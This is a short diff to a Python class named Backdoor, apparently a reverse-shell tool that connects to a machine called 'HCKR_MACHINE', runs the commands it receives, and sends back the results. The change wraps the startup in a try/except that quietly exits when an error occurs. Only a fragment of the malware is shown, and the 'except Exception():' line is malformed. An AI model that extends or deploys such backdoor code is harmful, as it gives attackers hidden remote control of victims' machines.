@@ -63,5 +63,8 @@ class Backdoor:
                 command_result = "[-] Error during command execution."
             self.reliable_send(command_result)
 
-bd = Backdoor("HCKR_MACHINE", PORT)
-bd.run()
+try:
+   bd = Backdoor("HCKR_MACHINE", PORT)
+   bd.run()
+except Exception():
+    sys.exit()
